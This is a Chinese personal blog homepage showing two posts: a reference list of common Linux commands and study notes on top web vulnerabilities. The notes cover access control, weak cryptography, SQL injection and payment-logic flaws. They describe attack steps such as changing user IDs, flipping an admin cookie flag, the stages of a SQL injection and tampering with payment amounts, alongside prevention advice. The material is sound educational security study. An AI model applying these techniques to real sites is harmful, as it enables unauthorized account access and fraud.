<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"acindm.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Welcome to the 1&#x2F;30000 🫧">
<meta property="og:type" content="website">
<meta property="og:title" content="acind の blog">
<meta property="og:url" content="https://acindm.github.io/index.html">
<meta property="og:site_name" content="acind の blog">
<meta property="og:description" content="Welcome to the 1&#x2F;30000 🫧">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://acindm.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>acind の blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">acind の blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2024/03/20/%E5%B8%B8%E7%94%A8Linux%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/20/%E5%B8%B8%E7%94%A8Linux%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">常用Linux命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-20 22:56:00" itemprop="dateCreated datePublished" datetime="2024-03-20T22:56:00+08:00">2024-03-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-21 22:56:53" itemprop="dateModified" datetime="2024-03-21T22:56:53+08:00">2024-03-21</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h3><p>绝大部分云基础设施和托管服务都在Linux操作系统中运行，所以了解甚至熟知Linux命令是至关重要的</p>
<p>之前看一个师傅说把电脑刷成Linux机的话对计算机一些底层原理的了解会更深入（我有进行这个尝试的想法hhh，毕竟全命令行操作确实很酷！</p>
<p>以下是Linux较全的命令收录👇🏻一些常用的不常用但是有一定概率会用到的都有收录</p>
<p>​        </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动terminal（终端）Ctrl+ Alt +T</span><br></pre></td></tr></table></figure>

<h4 id="🎞️最常用命令"><a href="#🎞️最常用命令" class="headerlink" title="🎞️最常用命令"></a>🎞️最常用命令</h4><ol>
<li><p><strong><code>ls</code> – 列出目录内容</strong></p>
</li>
<li><p><strong><code>cd</code> – 更改目录</strong></p>
</li>
<li><p><strong><code>mkdir</code> – 创建新目录</strong></p>
</li>
<li><p><strong><code>rmdir</code> – 删除目录</strong></p>
</li>
<li><p><strong><code>touch</code> – 创建新的空文件</strong></p>
</li>
<li><p><strong><code>cp</code> – 复制文件和目录</strong></p>
</li>
<li><p><strong><code>mv</code> – 移动或重命名文件和目录</strong></p>
</li>
<li><p><strong><code>rm</code> – 移除文件和目录</strong></p>
</li>
<li><p><strong><code>find</code></strong> <strong>– 在目录层次结构中搜索文件</strong></p>
</li>
<li><p><strong><code>du</code></strong> <strong>– 估算文件空间使用情况</strong></p>
</li>
<li><p><strong><code>grep</code></strong> <strong>命令 – 使用条件匹配搜索文本</strong></p>
</li>
<li><p><strong><code>awk</code></strong> <strong>– 条件扫描和处理语言</strong></p>
</li>
<li><p><strong><code>sed</code></strong> <strong>– 用于过滤和转换文本的流编辑器</strong></p>
</li>
<li><p><strong><code>sort</code></strong> <strong>– 对文本文件行进行排序</strong></p>
</li>
<li><p><strong><code>uniq</code></strong> <strong>– 报告或省略重复行</strong></p>
</li>
<li><p><strong><code>diff</code></strong> <strong>– 逐行比较文件</strong></p>
</li>
<li><p><strong><code>wc</code></strong> <strong>– 打印行数、字数和字节数</strong></p>
</li>
<li><p><strong><code>&gt;</code></strong> <strong>– 重定向标准输出</strong></p>
<p>重定向标准输出有助于将命令结果保存到文件中，以便存储、调试或将命令串联起来</p>
</li>
<li><p><strong><code>&gt;&gt;</code></strong> <strong>– 追加标准输出</strong></p>
<p><code>&gt;&gt;</code> 操作符将命令的标准输出追加到文件中，而不覆盖现有内容</p>
</li>
<li><p><strong><code>&lt;</code></strong> <strong>– 重定向标准输入</strong></p>
<p><code>&lt;</code> 重定向操作符将文件内容作为标准输入送入命令，而不是从键盘输入</p>
</li>
<li><p><strong><code>|</code></strong> <strong>– 管道输出到另一条命令</strong></p>
<p>管道 <code>|</code> 操作符将一条命令的输出作为输入发送到另一条命令，将它们串联起来</p>
<p>管道通常用于将命令串联起来，其中一个命令的输出为另一个命令的输入提供信息。这样就能从较小的单用途程序中构建出复杂的操作</p>
</li>
<li><p><strong><code>tee</code></strong> <strong>– 从标准输入读取并写入标准输出和文件</strong></p>
<p><code>tee</code> 命令将标准输入分为两个流</p>
<p>它将输入写入标准输出（显示主命令的输出），同时将副本保存到文件中</p>
<h4 id="🎞️Linux归档命令"><a href="#🎞️Linux归档命令" class="headerlink" title="🎞️Linux归档命令"></a>🎞️Linux归档命令</h4></li>
<li><p><strong><code>tar</code></strong> <strong>– 从归档文件中存储和提取文件</strong></p>
<p><code>tar</code> 命令可帮助你处理磁带归档文件（.tar）。它可以帮助你将多个文件和目录捆绑到一个压缩的 .tar 文件中</p>
</li>
<li><p><strong><code>gzip</code></strong> <strong>– 压缩或扩展文件</strong></p>
<p>gzip 命令使用 LZ77 编码压缩文件，以减小存储或传输文件的大小。使用 gzip，你可以处理 .gz 文件</p>
</li>
<li><p><strong><code>gunzip</code></strong> <strong>– 解压缩文件</strong></p>
<p><code>gunzip</code> 命令用于解压缩 .gz 文件</p>
</li>
<li><p><strong><code>zip</code></strong> <strong>– 打包和压缩文件</strong></p>
<p><code>zip</code> 命令用于创建包含压缩文件内容的 .zip 归档文件</p>
</li>
<li><p><strong><code>unzip</code></strong> <strong>– 从 ZIP 档案中提取文件</strong></p>
<p>与 <code>gunzip</code> 类似， <code>unzip</code> 命令可从 .zip 压缩文件中提取和解压缩文件</p>
<h4 id="Linux文件传输命令"><a href="#Linux文件传输命令" class="headerlink" title="Linux文件传输命令"></a>Linux文件传输命令</h4></li>
<li><p><strong><code>scp</code></strong> <strong>– 在主机间安全复制文件</strong></p>
<p><code>scp</code> （安全复制）命令通过 SSH 连接在主机间复制文件。所有数据传输都经过加密，以确保安全</p>
<h4 id="更多Linux命令"><a href="#更多Linux命令" class="headerlink" title="更多Linux命令"></a>更多Linux命令</h4></li>
<li><p><strong><code>mount</code></strong> – 将硬盘安装或 “连接 “到系统上</p>
</li>
<li><p><strong><code>umount</code></strong> – 从系统中卸载或 “移除” 硬盘。 </p>
</li>
<li><p>**<code>xargs </code>**– 生成并执行通过标准输入提供的命令。</p>
</li>
<li><p><strong><code>alias</code></strong> – 为冗长或复杂的命令创建快捷方式</p>
</li>
<li><p><strong><code>jobs</code> – 列出当前在后台运行任务的程序</strong></p>
</li>
<li><p><strong><code>bg</code> – 恢复已停止或暂停的后台进程</strong></p>
</li>
<li><p><strong><code>killall</code> – 通过程序名称而不是 PID 终止进程</strong></p>
</li>
<li><p><strong><code>history</code> – 显示当前终端会话中以前使用过的命令</strong></p>
</li>
<li><p><strong><code>man</code> – 直接在终端中访问命令的帮助手册</strong></p>
</li>
<li><p><strong><code>screen</code> – 从一个窗口管理多个终端会话。</strong></p>
</li>
<li><p><strong><code>ssh</code> – 建立与远程服务器的安全加密连接</strong></p>
</li>
<li><p><strong><code>tcpdump</code> – 根据特定标准捕获网络流量</strong></p>
</li>
<li><p><strong><code>watch</code> – 每隔一段时间重复一次命令，并突出显示输出差异</strong></p>
</li>
<li><p><strong><code>nc</code> – 打开 TCP 或 UDP 连接，进行测试和数据传输</strong></p>
</li>
<li><p><strong><code>nmap</code> – 主机发现、端口扫描和操作系统指纹</strong></p>
</li>
<li><p><strong><code>strace</code> – 通过跟踪操作系统信号和调用来调试进程</strong></p>
</li>
<li><p><strong><code>unalias</code>– 顾名思义，<code>unalias</code>命令旨在从已定义的别名中删除<code>alias</code></strong></p>
</li>
<li><p><strong><code>pwd</code>– 代表“打印工作目录”，它输出您所在目录的绝对路径</strong></p>
</li>
<li><p><strong><code>./</code> – .&#x2F; 符号本身不是命令，但在这个列表中值得一提。</strong><br>它允许shell直接从终端运行可执行文件，并在系统中安装任何解释器</p>
</li>
<li><p><strong><code>exit</code>– 自动关闭正在使用的终端</strong></p>
</li>
<li><p><strong><code>apt</code>, <code>yum</code>, <code>pacman</code> 命令</strong><br>无论使用的是哪个Linux发行版，都可能使用package管理器来安装、更新和删除每天使用的软件</p>
<p><strong>1. Debian-based (Ubuntu, Linux Mint)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gimp</span><br></pre></td></tr></table></figure>


<p><strong>2. Red Hat-based (Fedora, CentOS)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install gimp</span><br></pre></td></tr></table></figure>


<p><strong>3. Arch-based (Manjaro, Arco Linux)</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S gimp</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>echo</code>– 在终端中显示定义的文本</strong></p>
</li>
<li><p><strong><code>cat</code>– 用于直接从终端创建、查看和连接文件。</strong></p>
<p><strong><code>cat</code></strong> 是“concatenate”的缩写，用于直接从终端创建、查看和连接文件。它主要用于在不打开图形文本编辑器的情况下预览文件</p>
</li>
<li><p><strong><code>vim</code>– 使用高效的键绑定编辑纯文本文件</strong></p>
</li>
<li><p><strong><code>which</code>– 输出shell命令的完整路径。</strong><br><code>which</code>命令输出shell命令的完整路径</p>
</li>
<li><p><strong><code>shred</code>– 此命令会重复覆盖文件的内容。</strong><br>此命令会重复覆盖文件的内容，给定的文件极难恢复</p>
</li>
<li><p><strong><code>tail</code>– 打印文件内容后几行</strong></p>
</li>
<li><p><strong><code>head</code>– 输出文本文件的前10行</strong></p>
</li>
<li><p><strong><code>whatis</code>– 打印任何其他命令的说明</strong></p>
</li>
<li><p><strong><code>neofetch</code>– CLI（命令行界面）工具。</strong><br>Neofetch是一个CLI（命令行界面）工具，它在Linux发行版的ASCII徽标旁边显示有关系统的信息，如内核版本、shell和硬件</p>
</li>
<li></li>
<li><p><strong><code>less</code>– 允许您前后检查文件的程序</strong></p>
</li>
<li><p><strong><code>tmux</code> – 用于持续会话和分割的终端多路复用器</strong></p>
</li>
</ol>
<h4 id="速查常用Linux命令"><a href="#速查常用Linux命令" class="headerlink" title="速查常用Linux命令"></a>速查常用Linux命令</h4><table>
<thead>
<tr>
<th>ls</th>
<th>列出目录的内容</th>
</tr>
</thead>
<tbody><tr>
<td>alias</td>
<td>定义或显示别名</td>
</tr>
<tr>
<td>unalias</td>
<td>删除别名定义</td>
</tr>
<tr>
<td>pwd</td>
<td>打印工作目录</td>
</tr>
<tr>
<td>cd</td>
<td>更改目录</td>
</tr>
<tr>
<td>cp</td>
<td>复制文件和目录</td>
</tr>
<tr>
<td>rm</td>
<td>删除文件和目录</td>
</tr>
<tr>
<td>mv</td>
<td>移动（重命名）文件和目录</td>
</tr>
<tr>
<td>mkdir</td>
<td>创建目录</td>
</tr>
<tr>
<td>man</td>
<td>显示其他命令的手册页面</td>
</tr>
<tr>
<td>touch</td>
<td>创建空文件</td>
</tr>
<tr>
<td>chmod</td>
<td>更改文件权限</td>
</tr>
<tr>
<td>.&#x2F;</td>
<td>运行可执行文件</td>
</tr>
<tr>
<td>exit</td>
<td>退出当前shell会话</td>
</tr>
<tr>
<td>sudo</td>
<td>以超级用户身份执行命令</td>
</tr>
<tr>
<td>shutdown</td>
<td>关闭您的机器</td>
</tr>
<tr>
<td>htop</td>
<td>显示进程和资源信息</td>
</tr>
<tr>
<td>unzip</td>
<td>解压zip文件</td>
</tr>
<tr>
<td>apt,yum,pacman</td>
<td>包管理器</td>
</tr>
<tr>
<td>echo</td>
<td>显示文本行</td>
</tr>
<tr>
<td>cat</td>
<td>打印文件内容</td>
</tr>
<tr>
<td>ps</td>
<td>报告shell进程状态</td>
</tr>
<tr>
<td>kill</td>
<td>终止程序</td>
</tr>
<tr>
<td>ping</td>
<td>测试网络连接</td>
</tr>
<tr>
<td>vim</td>
<td>高效文本编辑</td>
</tr>
<tr>
<td>history</td>
<td>显示以前的命令列表</td>
</tr>
<tr>
<td>passwd</td>
<td>更改用户密码</td>
</tr>
<tr>
<td>which</td>
<td>返回程序的完整二进制路径</td>
</tr>
<tr>
<td>shred</td>
<td>覆盖文件以隐藏其内容</td>
</tr>
<tr>
<td>less</td>
<td>以交互式检查文件</td>
</tr>
<tr>
<td>tail</td>
<td>显示文件的最后几行</td>
</tr>
<tr>
<td>head</td>
<td>显示文件的第一行</td>
</tr>
<tr>
<td>grep</td>
<td>打印与给定条件匹配行</td>
</tr>
<tr>
<td>whoami</td>
<td>输出用户名</td>
</tr>
<tr>
<td>whatis</td>
<td>显示单行说明</td>
</tr>
<tr>
<td>wc</td>
<td>字数文件</td>
</tr>
<tr>
<td>uname</td>
<td>显示操作系统信息</td>
</tr>
<tr>
<td>neofetch</td>
<td>显示操作系统和硬件信息</td>
</tr>
<tr>
<td>find</td>
<td>搜索遵循模式的文件</td>
</tr>
<tr>
<td>wget</td>
<td>从互联网检索文件</td>
</tr>
</tbody></table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/12/07/Top%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/07/Top%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Top漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-12-07 15:32:06" itemprop="dateCreated datePublished" datetime="2023-12-07T15:32:06+08:00">2023-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-20 10:22:27" itemprop="dateModified" datetime="2024-03-20T10:22:27+08:00">2024-03-20</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>20 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h3 id="👉🏻TOP1：越权漏洞-Broken-Access-Control"><a href="#👉🏻TOP1：越权漏洞-Broken-Access-Control" class="headerlink" title="👉🏻TOP1：越权漏洞 Broken Access Control"></a>👉🏻TOP1：越权漏洞 Broken Access Control</h3><p><strong>简介</strong></p>
<p>主要分为水平越权和垂直越权。</p>
<ol>
<li><p><strong>水平越权</strong>：普通用户拥有其他平行级别用户的权限</p>
</li>
<li><p><strong>垂直越权</strong>：跨越自身所属用户组，获取更高级别用户的权限（比如管理员权限）</p>
<p>​</p>
</li>
</ol>
<p><strong>常见情况</strong></p>
<ol>
<li><p>通过修改url、内部应用程序状态或HTML页面绕过访问控制检查，或简单地使用自定义的API攻击工具</p>
<blockquote>
<p>网站以用户提交的id判断用户是否具有信息查询权限并返回用户提交id对应的用户信息</p>
<p>避免方式：根据用户本身的Session判断当前用户是否拥有读取个人信息权限</p>
<p>漏洞利用示例：攻击者A利用抓包工具将自动发送的查询请求中的userid修改为B用户的id，就可以查询到B用户的信息；未加密且用的是get请求时，通过修改url里的userid直接登入其他用户的账号</p>
</blockquote>
</li>
<li><p>特权提升，垂直越权</p>
<blockquote>
<p>用户具有阅读文章权限而不具有编辑文章权限，阅读文章的接口是read_article。权限保护方式基于接口名称的秘密</p>
<p>漏洞出现原因：可以猜测到修改文章的接口是edit_article</p>
<p>漏洞利用示例：攻击者A根据阅读文章的接口名称是read_article猜测修改文章的接口名称是edit_article，调用该接口，实现垂直越权</p>
</blockquote>
</li>
<li><p>修改Cookie中参数</p>
<blockquote>
<p>早期的网站设计会在Cookie中加入“admin &#x3D; true”标识用户是否具有管理员权限</p>
<p>漏洞出现原因：Cookie不同于Session，Cookie中的参数存储在用户浏览器上，可以直观展现给用户；Session存储在服务器端，比Cookie安全</p>
<p>漏洞利用示例：攻击者A掌握网站的Cookie规律后</p>
<p>​                           方法①：通过JavaScript代码重置 document.cookie 内容越权</p>
<p>​                           方法②：抓包将“admin &#x3D; false”修改为“admin &#x3D; true”</p>
</blockquote>
</li>
<li><p>系统权限回收有问题</p>
<blockquote>
<p>漏洞出现原因：网站保留了注销用户信息而没有把它从用户表中删除，而仅仅对该用户是否有效这个字段进行了标记</p>
<p>漏洞利用示例：攻击者A注册时保留与注销用户B同样的用户id，覆盖了原用户的信息单保留了元用户的权限</p>
</blockquote>
<p>​</p>
</li>
</ol>
<p><strong>检测方法</strong></p>
<p>未授权访问与水平越权：cookie伪造；修改返回包中某个参数的值（比如false改为true）；水平越权常见与业务系统中，对用户信息或者订单信息进行增删改查操作时，用户编号和订单编号常常有规律可循，测试人员通过burpsuit的intruder对目标参数进行遍历测试即可</p>
<p>垂直越权：将cookie中的false改为true；文件上传与下载漏洞可以通过.&#x2F;和..&#x2F;绕过，admin权限验证绕过也可以尝试这种方法</p>
<p><strong>如何预防？</strong></p>
<p>将访问控制限制在仅在受信任的服务器端代码或者无服务器API中，这样攻击者就无法修改访问控制检查或元数据</p>
<ol>
<li><p>合理划分网站权限，设置功能验证，验证失败禁止访问</p>
</li>
<li><p>最小权限原则。除公有资源外，其他资源默认情况下拒绝访问，限制用户不必要的权限，用户权限过期后收回</p>
</li>
<li><p>进行严格的权限判断，用户只能操作属于自己的内容。此处权限判断需要识别用户身份，识别用户身份基于Session而非Cookie验证（即在服务器端进行验证）</p>
</li>
<li><p>记录失败的访问控制，适当时候对管理员进行告警（比如银行卡密码最多输入三次三次输错需要重新验证&#x2F;找管理员更改密码，不能无限次试。避免了暴力破解）</p>
</li>
<li><p>对API和控制器的访问进行速率限制（避免高速爆破），最大限度降低自动化攻击工具的危害（也会有后续处置，比如后台发现某个ip多次异常尝试且多次失败，就把ip封了） </p>
<p>​</p>
</li>
</ol>
<p><strong>补充知识</strong></p>
<ul>
<li>网站会给用户分配不同的Session（会话标识符）维持用户对话</li>
</ul>
<p>​                      </p>
<p>​                               </p>
<h3 id="👉🏻TOP2：加密机制失效-Cryptographic-Failures"><a href="#👉🏻TOP2：加密机制失效-Cryptographic-Failures" class="headerlink" title="👉🏻TOP2：加密机制失效  Cryptographic Failures"></a>👉🏻TOP2：加密机制失效  Cryptographic Failures</h3><p><strong>简介</strong></p>
<p>通常是缺乏加密措施或者加密失效导致敏感数据泄露</p>
<p>​            </p>
<p><strong>常见情况</strong></p>
<ol>
<li>以明文方式传输数据，未执行加密</li>
<li>使用旧or弱加密算法或协议</li>
<li>使用弱加密密钥、重复使用弱加密密钥、缺少适当的密钥管理和轮换、不小心将加密密钥提交到了源代码数据库中</li>
<li>接收到的服务器证书和信任链没有经过正确验证</li>
</ol>
<p>​    </p>
<p><strong>如何预防？</strong></p>
<ol>
<li>使用安全协议对所有数据进行传输加密</li>
<li>使用最新版且标准的强演算法、协定及密钥；使用适当的密钥管理</li>
<li>使用经过身份验证的加密而不仅仅是加密</li>
</ol>
<p>​    </p>
<p><strong>攻击范例</strong></p>
<ol>
<li><strong>情境1</strong>：某应用程序加密了存储在数据库中的信用卡号，但却在检索数据时自动解密，因此容易受到 SQL 注入攻击，导致信用卡号被泄露</li>
<li><strong>情境2</strong>：网站没有强制使用 TLS 或支持弱加密，导致攻击者能够通过网络监控、降级 HTTPS 连接为 HTTP，并截取会话 cookies，从而劫持用户的会话并访问或修改其隐私数据。攻击者还可以篡改传输的数据，例如修改汇款收款人信息</li>
<li><strong>情境3</strong>：密码库使用简单的散列函数存储密码，没有使用盐值或者使用了简单的盐值。由于上传文件的漏洞，攻击者可以访问密码库，未经盐值加密的哈希密码可以被预先计算的彩虹表破解。即使使用了盐值，如果哈希函数简单或快速，仍然容易受到 GPU 加速破解（PS：“盐”指随机生成的额外字符串）</li>
</ol>
<p>​                  </p>
<p>​                  </p>
<h3 id="👉🏻TOP3：注入攻击-Injection"><a href="#👉🏻TOP3：注入攻击-Injection" class="headerlink" title="👉🏻TOP3：注入攻击 Injection"></a>👉🏻TOP3：注入攻击 Injection</h3><p>web对用户输入的内容的合法性判断不严或者过滤不严，攻击者在web应用程序中事先定义好的查询语句的结尾添加额外的执行语句，在管理员不知情的情况下进行非法操作，奇葩数据库执行非授权的任意查询，进一步得到数据信息。</p>
<p>​    </p>
<p><strong>SQL注入</strong>：把SQL命令插入到Web表单递交或者输入域名或者页面请求的查询字符串，欺骗服务器执行恶意SQL命令</p>
<p><strong>SQL注入分类</strong>：所有与用户进行交互的地方都可能存在注入</p>
<ol>
<li><p>基于数据类型：字符串类型注入；整型注入</p>
</li>
<li><p>基于程度和顺序的注入：一阶注入；二阶注入</p>
</li>
<li><p>基于从服务器收到的响应</p>
</li>
<li><p>基于错误的SQL查询</p>
</li>
<li><p>联合查询的类型</p>
</li>
<li><p>堆查询注射</p>
</li>
<li><p>SQL盲注：基于布尔；时间；报错</p>
<p>​</p>
</li>
</ol>
<p><strong>注入思路</strong>：</p>
<ol>
<li>判断是否存在注入，类型是字符型还是数字型</li>
<li>猜解SQL查询语句中的字段数</li>
<li>确定显示的字段顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
</ol>
<p><strong>盲注思路</strong></p>
<ol>
<li>判断是否存在注入，类型是字符型还是数字型</li>
<li>猜解SQL查询语句中的字段数</li>
<li>猜解数据库名</li>
<li>猜解数据库表名</li>
<li>猜解表中字段名</li>
<li>猜解数据</li>
</ol>
<p><strong>防范方式</strong></p>
<ol>
<li>关闭SQL错误回显</li>
<li>使用成熟的WAF</li>
<li>前端输入字符白名单验证（长度、类型）</li>
<li>SQL服务运行专门的账号并且使用最小权限</li>
<li>对输入的特殊字符进行转义处理</li>
</ol>
<p>​                </p>
<p>​                     </p>
<h3 id="👉🏻TOP4：不安全设计"><a href="#👉🏻TOP4：不安全设计" class="headerlink" title="👉🏻TOP4：不安全设计"></a>👉🏻TOP4：不安全设计</h3><p><strong>产生原因</strong></p>
<p>开发软件时在关键的身份验证、访问控制、业务逻辑和关键流部位没有进行安全的设计</p>
<p><strong>漏洞利用</strong></p>
<p>业务逻辑的体现</p>
<ol>
<li>支付逻辑</li>
<li>密码找回</li>
<li>验证码：暴力破解；重复使用；客户端回显；绕过；自动识别</li>
</ol>
<p><strong>支付逻辑漏洞</strong></p>
<p>修改支付价格、状态；修改购买数量；修改优惠券和积分；修改支付接口；多重替换支付；重复支付；最小额和最大额支付；无限制试用</p>
<p>​    </p>
<p><strong>场景</strong></p>
<ol>
<li>使用burpsuit抓包并且修改原始数据（用户界面数据无法更改，前端有封装），将运费金额30修改为9.9</li>
<li>把state的值从2修改为1，这样随机输入的密码也会被识别为真，导致任意密码重置</li>
</ol>
<p>​     </p>
<p>​    </p>
